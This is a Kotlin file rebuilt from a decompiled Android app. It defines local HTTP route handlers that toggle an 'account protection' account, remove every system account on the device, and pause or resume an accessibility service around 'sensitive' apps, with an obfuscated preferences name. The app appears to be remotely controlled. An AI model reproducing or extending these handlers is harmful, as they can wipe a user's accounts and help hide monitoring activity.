package com.storm.safe.rock.service.modules.routes

import android.accounts.AccountManager
import android.content.Context
import android.util.Log
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.account.AccountProtectionManager
import com.storm.safe.rock.service.modules.RemoteConfigManager.Companion.makeErrorResponse
import com.storm.safe.rock.service.modules.RemoteConfigManager.Companion.makeTextResponse
import com.storm.safe.rock.util.StringUtil
import org.json.JSONObject

/**
 * Account protection and accessibility pause/resume route handlers.
 *
 * Extracted from RemoteConfigManager (JADX: C0322a7).
 * JADX methods: c0, b9, c9 (account), c8, d0 (accessibility pause/resume).
 */
object AccountRouteHandlers {
    private const val TAG = "LocalHttpServer"

    // ---------------------------------------------------------------
    // Account protection -- JADX: c0, b9, c9
    // ---------------------------------------------------------------

    /**
     * /enableAccountProtection -- enable account-based protection.
     * JADX: m211611c0 (c0)
     */
    @JvmStatic
    fun enableAccountProtection(context: Context): JSONObject {
        return try {
            context.getSharedPreferences(
                StringUtil.decrypt("IkowPkAxAg9UJSJPEC5ENgs="), 0
            ).edit().putBoolean("accountProtectionEnabled", true).commit()
            Log.d(TAG, "★ accountProtectionEnabled = true（开启账户保护）")
            val apm = AccountProtectionManager.getInstance(context)
            if (!apm.hasAccount()) {
                apm.createAccount()
                Log.d(TAG, "★ 账户保护已启用，立即创建账号")
            }
            makeTextResponse("accountProtectionEnabled=true")
        } catch (e: Exception) {
            Log.e(TAG, "handleEnableAccountProtection 异常", e)
            makeErrorResponse("enableAccountProtection 异常: ${e.message}")
        }
    }

    /**
     * /disableAccountProtection -- disable account-based protection.
     * JADX: m211610b9 (b9)
     */
    @JvmStatic
    fun disableAccountProtection(context: Context): JSONObject {
        return try {
            context.getSharedPreferences(
                StringUtil.decrypt("IkowPkAxAg9UJSJPEC5ENgs="), 0
            ).edit().putBoolean("accountProtectionEnabled", false).commit()
            Log.d(TAG, "★ accountProtectionEnabled = false（关闭账户保护）")
            AccountProtectionManager.getInstance(context).removeAccount()
            makeTextResponse("accountProtectionEnabled=false")
        } catch (e: Exception) {
            Log.e(TAG, "handleDisableAccountProtection 异常", e)
            makeErrorResponse("disableAccountProtection 异常: ${e.message}")
        }
    }

    /**
     * /removeAllAccounts -- remove all accounts from device.
     * JADX: m211618c9 (c9)
     */
    @JvmStatic
    fun removeAllAccounts(context: Context): JSONObject {
        return try {
            val removed = AccountProtectionManager.getInstance(context).removeAccount()
            Log.d(TAG, "★ removeAllAccounts: removed=$removed")
            try {
                val am = AccountManager.get(context)
                val accounts = am.accounts
                var count = 0
                for (account in accounts) {
                    try {
                        am.removeAccount(account, null, null)
                        count++
                        Log.d(TAG, "★ 删除系统账户: ${account.name} (${account.type})")
                    } catch (e: Exception) {
                        Log.w(TAG, "⚠️ 删除账户失败: ${account.name}: ${e.message}")
                    }
                }
                makeTextResponse("removed=$removed, systemAccounts=$count")
            } catch (e: Exception) {
                makeTextResponse("removed=$removed, systemError=${e.message}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "handleRemoveAllAccounts 异常", e)
            makeErrorResponse("removeAllAccounts 异常: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Accessibility pause/resume -- JADX: c8, d0
    // ---------------------------------------------------------------

    /**
     * /pauseAccessibility -- pause accessibility for sensitive app.
     * JADX: m211591c8 (c8)
     */
    @JvmStatic
    fun pauseAccessibility(params: Map<String, String>): JSONObject {
        return try {
            val reason = params["reason"] ?: "unknown"
            Log.d(TAG, "★★★ [敏感App] 收到暂停请求: reason=$reason")
            MyAccessibilityService.pauseForSensitiveApp()
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            val data = JSONObject()
            data.put("paused", true)
            data.put("reason", reason)
            data.put("timestamp", System.currentTimeMillis())
            json.put("data", data)
            json.put("message", "无障碍事件处理已暂停")
            json
        } catch (e: Exception) {
            Log.e(TAG, "暂停失败", e)
            makeErrorResponse("暂停失败: ${e.message}")
        }
    }

    /**
     * /resumeAccessibility -- resume accessibility after sensitive app.
     * JADX: m211592d0 (d0)
     */
    @JvmStatic
    fun resumeAccessibility(params: Map<String, String>): JSONObject {
        return try {
            val reason = params["reason"] ?: "unknown"
            Log.d(TAG, "★★★ [敏感App] 收到恢复请求: reason=$reason")
            MyAccessibilityService.resumeFromSensitiveApp()
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            val data = JSONObject()
            data.put("paused", false)
            data.put("reason", reason)
            data.put("timestamp", System.currentTimeMillis())
            json.put("data", data)
            json.put("message", "无障碍事件处理已恢复")
            json
        } catch (e: Exception) {
            Log.e(TAG, "恢复失败", e)
            makeErrorResponse("恢复失败: ${e.message}")
        }
    }
}
